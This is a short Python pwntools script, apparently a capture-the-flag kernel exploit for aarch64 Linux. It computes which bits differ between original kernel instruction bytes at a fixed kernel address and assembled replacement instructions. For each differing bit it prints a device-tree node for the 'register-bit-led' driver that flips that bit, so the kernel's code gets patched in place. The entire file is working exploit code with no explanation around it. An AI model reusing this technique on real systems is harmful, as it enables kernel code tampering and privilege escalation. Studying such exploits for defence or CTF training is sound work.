from pwn import *

context.arch = "aarch64"

# data flip (failed)
# original = 0xFFFF8000115E342C
# target = 0xFFFF0000022EA360

# instruction flip
# pc = 0xFFFF800010CA9450
original = b"\x2A\x4B\x00\x90\x4A\xC5\x35\x91"
target = asm("""ldr x3, #0xea360\neor x3, x3, #0xffff0000000""")

original = u64(original)
target = u64(target)

payload = ""

for b in range(64):
    obit = (original >> b) & 1
    tbit = (target >> b) & 1

    if obit != tbit:
        offset = (b // 32) * 4
        mask = 1 << (b % 32)

        if obit == 0:
            state = "on"
        else:
            state = "off"

        payload += f"""
        flip@{b} {{
            compatible = "register-bit-led";
            offset = <0x{offset:x}>;
            mask = <0x{mask:x}>;
            label = "flip{b}";
            default-state = "{state}";
        }};
"""

print(payload)
